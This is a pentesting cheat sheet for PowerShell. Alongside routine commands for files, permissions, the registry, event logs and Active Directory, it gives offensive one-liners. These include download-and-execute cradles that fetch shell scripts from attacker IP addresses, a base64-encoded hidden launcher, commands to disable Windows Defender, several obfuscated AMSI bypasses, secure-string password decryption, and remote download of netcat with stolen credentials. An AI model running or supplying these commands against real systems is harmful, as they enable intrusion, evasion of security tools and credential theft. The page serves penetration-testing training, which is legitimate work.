# Basic PowerShell for Pentesters

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

[ss64](https://ss64.com/nt/) Is a handy quick reference for anything command-line related, including cmd, PowerShell, Bash, and more.
## Default PowerShell locations

```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```

## Basic PS commands to start

```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Get-Command # find a pesky command that might be slipping from our memory
Get-Command -verb get # with -verb for commands with the term get in the name
Get-Command get* # with * wildcard for commands with the term get in the name
Get-Command -noun windows* #took the filter a step further, and looked for any portion of the noun that contained `windows*`

Get-Alias # Most built-in aliases are shortened versions of the cmdlet,
Set-Alias -Name gh -Value Get-Help # set an alias for a specific cmdlet 
# pwd - Alias for Get-Location (gl can also be used)
# ls - Alias for Get-ChildItem, Get-Item (dir and gci can also be used)
# cd - Alias for Set-Location (sl and chdir can also be used)
# cat - Alias for Get-Content (type and gc can also be used)
# clear - Alias for Clear-Host
# curl - Alias for Invoke-WebRequest (wget can also be used)
# fl - Formats output into a list (Alias for Format-List)
# ft - Formats output into a table (Alias for Format-Table)
# man - Alias for help



Get-History # show the commands that have been run during this active session
get-content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # OR  Get-Content (Get-PSReadlineOption).HistorySavePath `PSReadLine` module tracks the history of any PowerShell commands used in all sessions across the host,
Clear-Host OR cls # clear screen

# HotKkeys
# CTRL+R - Searchable history: Start typing after pressing to find matching previous commands
# CTRL+L - Clears the screen quickly
# CTRL+ALT+Shift+? - Prints the entire list of recognized PowerShell keyboard shortcuts
# Escape - Clears the entire input line
# ‚Üë - Scrolls up through command history
# ‚Üì - Scrolls down through command history
# F7 - Opens a scrollable interactive history menu

Import-Module <modulepath> # $env:PSModulePath
Get-Command -Module <modulename>

Get-Module # determine what modules are already loaded.
Get-Module -ListAvailable # show all modules we have installed but not loaded into our session.
$env:PSModulePath # environment variable  that defines the search paths for  modules. When you run `Import-Module`, PowerShell looks for modules in these directories.
Import-Module .\PowerSploit.psd1 # Importing PowerSploit.psd1
Get-NetLocalgroup # runnig a command in imported module
$env:PSModulePath # 

# change the execution policy
Get-ExecutionPolicy # > if Restricted change it to
Set-ExecutionPolicy undefined # remove limit our interactions. Now we should be able to import and run our script.
# Another way we can bypass the execution policy and not leave a persistent change is to change it at the process level using -scope
PS C:\htb> Set-ExecutionPolicy -scope Process # change it at the process level
PS C:\htb> Get-ExecutionPolicy -list #>  Process ->  bypass
# This blog https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/ has some creative ways that we have used on real-world engagements with great success

Get-Help <model> 
Get-Command -Module <modulename> # List aliases, cmdlets, and functions an imported module

# find & Installing Modules from PowerShell Gallery & GitHub
Get-Command -Module PowerShellGet # default module help us to interact with the powershell gallery 
Find-Module -Name AdminToolbox # search for module, we can search by wildcard *
`Install-Module
Find-Module -Name AdminToolbox | Install-Module # requires administrative rights to install modules in this manner

# some of intersting tools in powershell
# AdminToolbox: Admin modules for AD, Exchange, network, and storage.  
# ActiveDirectory: Manages AD users, groups, and permissions.  
# Empire: Situational awareness in hosts/domains (Empire Framework).  
# Inveigh: Network spoofing & MITM attacks.  
# BloodHound: AD mapping with C#/PowerShell data collectors.  

----------------------------------------------------------------------------
#  Creating/Moving/Deleting Files & Directories
## Navigation
Get-Location  # Get current directory
cd <Path>  # Change directory
ls   # List contents -Recurse parameter for list the sub-directoryes  (Alias: dir, gci,  Get-ChildItem -Hidden )

## File & Folder Management
mkdir "FolderName"  # Create directory (Alias: md, ni, new-item -name "x" -type directory)
ni "file.txt" -ItemType File  # Create file (new-item -name "note" -type file)
cp "source.txt" "dest.txt"  # Copy file/folder (Alias: copy, ci)
mv "oldname.txt" "newname.txt"  # Move/Rename file/folder
rm "file.txt"  # Delete file/folder (Alias: del, rmdir)
## File Content Operations
cat "file.txt"  # Display file contents (Alias: type)
Add-Content "file.txt" "New Line"  # Append content
Set-Content "file.txt" "Overwritten Text"  # Replace content
Clear-Content "file.txt"  # Clear content
diff (gc file1.txt) (gc file2.txt)  # Compare two files (Alias: compare)

# Directory & File Setup
mkdir SOPs; cd SOPs; mkdir "Physical Sec", "Cyber Sec", "Training"  # Create folder structure
ni "SOPs\ReadMe.md", "SOPs\Physical Sec\Physical-Sec-draft.md", "SOPs\Cyber Sec\Cyber-Sec-draft.md", "SOPs\Training\Employee-Training-draft.md" -ItemType File  # Create files 
$header = "Title: Insert Document Title Here`nDate: x/x/202x`nAuthor: MTanaka`nVersion: 0.1 (Draft)"
Add-Content "SOPs\ReadMe.md" $header  # Add structured content
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# View File Permissions
## Get-Acl retrieves the current access control list (ACL) of a file or folder
Get-Acl "C:\path\to\file_or_folder"

## Method 2 (the best):
ls | foreach-object { icacls $_.fullname }  # List files and check their ACLs (Access Control Lists)

# Example Output:
# NT SERVICE\TrustedInstaller:(F)  # (F) Full control
# NT AUTHORITY\SYSTEM:(M)          # (M) Modify
# BUILTIN\Administrators:(RX)      # (RX) Read & Execute
# BUILTIN\Users:(GR,GE)            # (GR) Generic Read, (GE) Generic Execute
# CREATOR OWNER:(OI)(CI)(IO)(F)    # (OI) Object Inherit, (CI) Container Inherit, (IO) Inherit Only, (F) Full control
# APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)  # Allows execution for all app packages

## Change File Permissions

# Grant Full Control to a specific user
$acl = Get-Acl "C:\path\to\file_or_folder"  # Get current ACL
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Username", "FullControl", "Allow")  # Define new rule
$acl.SetAccessRule($rule)  # Apply the rule
Set-Acl "C:\path\to\file_or_folder" -AclObject $acl  # Save the changes

# Remove a user's permission
$acl = Get-Acl "C:\path\to\file_or_folder"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Username", "FullControl", "Allow")
$acl.RemoveAccessRule($rule)
Set-Acl "C:\path\to\file_or_folder" -AclObject $acl

# Change Ownership of a File or Folder
$path = "C:\path\to\file_or_folder"
$acl = Get-Acl $path  # Get current ACL
$owner = New-Object System.Security.Principal.NTAccount("NewUsername")  # Define new owner
$acl.SetOwner($owner)  # Set new owner
Set-Acl -Path $path -AclObject $acl  # Save the changes

# Grant Read & Execute Permissions to Everyone
$acl = Get-Acl "C:\path\to\file_or_folder"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "ReadAndExecute", "Allow")
$acl.SetAccessRule($rule)
Set-Acl "C:\path\to\file_or_folder" -AclObject $acl

# Alternative Method: Using icacls
icacls "C:\path\to\file.txt" /grant Ahmed:F  # Full control (F)
icacls "C:\path\to\file.txt" /remove Ahmed  # Remove Ahmed‚Äôs access
icacls "C:\path\to\file.txt" /grant Ahmed:RX  # Read (R) + Execute (X)
icacls "C:\path\to\file.txt" /reset  # Reset to default
takeown /f "C:\path\to\file.txt"  # Take ownership
icacls "C:\path\to\file.txt" /setowner Ahmed  # Set owner to Ahmed

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# Finding & Filtering Content
Get-LocalUser administrator | Get-Member  # Get user object properties & methods 
Get-LocalUser administrator | Select-Object -Property *  # Display all user properties  
Get-LocalUser * | Select-Object Name,PasswordLastSet  # List all users & their last password set date  
Get-LocalUser * | Sort-Object Name | Group-Object Enabled  # Sort users by name & group by Enabled status  

#search  output
Get-Service | Select-Object DisplayName,Name,Status | Sort-Object DisplayName | Format-List  # Get all services with selected properties  
Get-Service | Where-Object DisplayName -like "*Defender*"  # Find Windows Defender services by displayname

# piping  only support PowerShell 7
Get-Process | sort | unique | measure-object #  pipeline output the total count  of unique processes
# `&&`:  execute the next command inline `if` the current command `completes properly`.
#  `||`: execute the following command inline `if` the current command `fails`.


# where {($_.<Property-Name> <-like/-ep> "*<file_name>*")}
ls | where {($_.Name -like "*.txt")} #  find only the *.txt files ,

sls "ahmed" -path note.txt # search onsite the file content 

## Combining the Searches
 Get-Childitem ‚ÄìPath C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv")} | sls "Password","credential","key","UserName" # (`-ErrorAction SilentlyContinue`). This helps us to ensure that our entire pipeline stays intact when it happens along a file or directory it cannot read.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
## Windows Registry Notes

# What is the Windows Registry?
# - Stores system and software settings.
# - Contains keys (folders) and values (data).
# - Used for configurations and persistence.

# Registry Structure
# - Located at: C:\Windows\System32\Config\
# - Main Hives:
HKEY_LOCAL_MACHINE (HKLM)  # Stores hardware and OS data, including drivers and memory info
HKEY_CURRENT_CONFIG (HKCC)  # Holds current hardware profile settings
HKEY_CLASSES_ROOT (HKCR)  # Manages file type associations and UI extensions
HKEY_CURRENT_USER (HKCU)  # Stores user-specific OS and software settings
HKEY_USERS (HKU)  # Contains default and current user profiles

# Keys & Values
# - Keys: Folders with subkeys & values.
# - Values: Data (e.g., REG_SZ, REG_DWORD).
# - Example:
#   - Key: HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Adobe Acrobat\10.0\Installer
#   - Value: DisableMaintenance = 1

ls -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\' # 

Get-Item -Path Registry::<HIVE>\Path-to-key\ | Select-Object -ExpandProperty Property  # Get properties of a registry key
Get-ChildItem -Path <HIVE>:\Path-to-key -Recurse  # Recursively search a key and subkeys
Get-ItemProperty -Path Registry::<HIVE>\Path-to-key\key  # View properties and values of a key
REG QUERY <HIVE>\PATH\KEY  # Query the registry using reg.exe
REG QUERY <HIVE> /F "Password" /t REG_SZ /S /K  # Search for a specific string in the registry
New-Item -Path <HIVE>:\PATH\ -Name KeyName  # Create a new registry key
New-ItemProperty -Path <HIVE>:\PATH\KEY -Name "ValueName" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"  # Set a new key-value pair
REG add "<HIVE>\PATH\KEY" /v <ValueName> /t REG_SZ /d "C:\Users\htb-student\Downloads\payload.exe"  # Use reg.exe to create a key-value pair
Remove-ItemProperty -Path <HIVE>:\PATH\KEY -Name "name"  # Delete a key-value from the registry
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# Event Log
# Log Categories
# System Log: System events (e.g., service failures).
# Security Log: Security events (logins, file actions).
# Application Log: Software-related events (e.g., app crashes).
# Setup Log: OS installation and AD-related events.
# Forwarded Events: Logs from other networked hosts.

Get-WinEvent -ListLog * # Listing All Logs
Get-WinEvent -ListLog Security # Security Log Details

Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message # query for the last X number of events, looking specifically for the last five events, we can reverse the order to list the oldest ones first using the `-Oldest` parameter
Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '} # look at specific event IDs in specific logs.

Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message # only events with a specific information level



```

## Download & Execute

```powershell

powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this: 
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```

### Download & Execute in background with AMSI Bypass

```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=" 
```

### Using b64 from linux

```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```

## Download

```bash
# Download file using System.Net.WebClient
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")

# Invoke-WebRequest (use -UseBasicParsing on old versions)
Invoke-WebRequest -Uri "https://en.wikipedia.org/wiki/Spider-Man" -Method GET | Get-Member # Get all properties of the site
Invoke-WebRequest -Uri "https://en.wikipedia.org/wiki/Spider-Man" -Method GET -UseBasicParsing # Get raw content

# Download a file using Invoke-WebRequest
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"

# Download file using wget (alias for Invoke-WebRequest in PowerShell)
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

## Base64 Kali & EncodedCommand

```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```

## [Execution Policy](../authentication-credentials-uac-and-efs/#ps-execution-policy)

## [Constrained language](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/basic-powershell-for-pentesters/broken-reference/README.md)

## [AppLocker Policy](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/basic-powershell-for-pentesters/broken-reference/README.md)

## Enable WinRM (Remote PS)

```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
  Where{ $_.NetWorkCategory -ne 'Private'} |
  ForEach {
    $_
    $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
  }
```

## Disable Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSI bypass

**`amsi.dll`** is **loaded** into your process, and has the necessary **exports** for any application interact with. And because it's loaded into the memory space of a process you **control**, you can change its behaviour by **overwriting instructions in memory**. Making it not detect anything.

Therefore, the goal of the AMSI bypasses you will are to **overwrite the instructions of that DLL in memory to make the detection useless**.

**AMSI bypass generator** web page: [**https://amsi.fail/**](https://amsi.fail/)

```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1 
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( ) 

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```

### AMSI Bypass 2 - Managed API Call Hooking

Check [**this post for detailed info and the code**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/). Introduction:

This new technique relies upon API call hooking of .NET methods. As it turns out, .NET Methods need to get compiled down to native machine instructions in memory which end up looking very similar to native methods. These compiled methods can hooked to change the control flow of a program.

The steps performing API cal hooking of .NET methods are:

1. Identify the target method to hook
2. Define a method with the same function prototype as the target
3. Use reflection to find the methods
4. Ensure each method has been compiled
5. Find the location of each method in memory
6. Overwrite the target method with instructions pointing to our malicious method

### AMSI Bypass 3 - SeDebug Privilege

[**Following this guide & code**](https://github.com/MzHmO/DebugAmsi) you can see how with enough privileges to debug processes, you can spawn a powershell.exe process, debug it, monitor when it loads `amsi.dll` and disable it.

### AMSI Bypass - More Resources

* [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
* [Amsi Bypass on Windows 11 In 2023](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6) [Github](https://github.com/senzee1984/Amsi\_Bypass\_In\_2023)

## PS-History

```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

## Find a newer files

Options : `CreationTime`, `CreationTimeUtc`, `LastAccessTime`, `LastAccessTimeUtc`, `LastWriteTime`, `LastWriteTimeUtc`

```powershell
# LastAccessTime:
(gci C:\ -r | sort -Descending LastAccessTime | select -first 100) | Select-Object -Property LastAccessTime,FullName

# LastWriteTime:
(gci C:\ -r | sort -Descending LastWriteTime | select -first 100) | Select-Object -Property LastWriteTime,FullName
```

## Get permissions

```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

## OS version and HotFixes

```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

## Environment

```powershell
Get-ChildItem Env: | ft Key,Value -AutoSize #get all values
$env:UserName @Get UserName value
```

## Other connected drives

```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

### Recycle Bin

```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```

[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## Domain Recon
```bash
echo $env:ComputerName # host ComputerName


### Managing Domain Users and Groups
# we must install the `ActiveDirectory` PowerShell Module. If you installed the AdminToolbox, the AD module might already be on your host
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online # `ALL` RSAT features
Get-Module -Name ActiveDirectory -ListAvailable # check and locat the AD module


Get-ADUser -Identity ahmed -Properties * #  Get a Specific User

Get-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail # get user & including Properties

# attributes
# ObjectClass      # Type of object (user, computer, etc.)  
# DistinguishedName  # AD path of the object  
# Enabled         # True = Active, False = Disabled  
# SamAccountName  # Username for login  
# ObjectGUID      # Unique identifier 
#   We could also use these to filter specific attributes
Get-ADUser -Filter *               # List all users  
Get-ADUser -Filter {Name -eq "TSilver"}  # Search  for user by name , ` Identity` parameter is for  specific search  by `distinguished name, GUID.
# Users have many different attributes ( not all shown here )
Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'} # filter the user's `Email addres`

# add new user to AD 
New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true

# Changing a Users Attributes
Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"

---------------------------------------------------------------------------
Get-Service -ComputerName ACADEMY-ICL-DC #  Remotely Query Services
# filter the output 
Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}
invoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'} #  `Invoke-Command` runs commands locally or remotely, `-ComputerName` specifies targets, and `-ScriptBlock {}` contains the commands to execute.

```
{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}
## Users

```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon # Get all users
Get-LocalUser -Name "Ahmed" | select * # list all property of user
Get-ChildItem C:\Users -Force | select Name # Get users 
New-LocalUser -Name "ahmed" -NoPassword # creat new user
Set-LocalUser "ahmed" -Password (ConvertTo-SecureString "ahmed123" -AsPlainText -Force) # Modife the user password it samme as  Set-LocalUser "ahmed" -Password (READ-HOST "entre pass" -AsSecureString)


```

## Secure String to Plaintext

```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

Or directly parsing form XML:

```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

## SUDO

```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```

## Groups

```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource # see who is a member of of Administrators Group
Add-LocalGroupMember -Group "Administrators" -Member "ahmed" # add user to the group

```

## Clipboard

```powershell
